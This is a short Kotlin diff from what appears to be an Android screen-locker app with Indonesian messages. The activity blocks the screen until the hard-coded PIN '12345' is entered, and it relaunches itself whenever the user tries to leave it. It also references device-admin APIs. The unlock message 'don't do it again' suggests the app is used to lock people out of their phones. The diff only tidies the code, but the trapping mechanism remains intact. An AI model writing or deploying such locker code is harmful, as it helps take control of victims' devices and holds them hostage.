@@ -17,7 +17,7 @@ import android.widget.Toast
 
 class LockActivity : Activity() {
 
-    private val PIN = "12345" // PIN rahasia BOS
+    private val PIN = "12345"
     private val handler = Handler(Looper.getMainLooper())
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -53,8 +53,6 @@ class LockActivity : Activity() {
             text = "BUKA"
             setOnClickListener {
                 if (input.text.toString() == PIN) {
-                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                    val admin = ComponentName(this@LockActivity, AdminReceiver::class.java)
                     finishAffinity()
                     Toast.makeText(this@LockActivity, "Unlocked. Jangan ulangi.", Toast.LENGTH_LONG).show()
                 } else {
@@ -86,8 +84,8 @@ class LockActivity : Activity() {
         super.onPause()
         handler.postDelayed({
             val i = intent
-            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
-                       android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
+                       Intent.FLAG_ACTIVITY_CLEAR_TOP)
             startActivity(i)
         }, 300)
     }
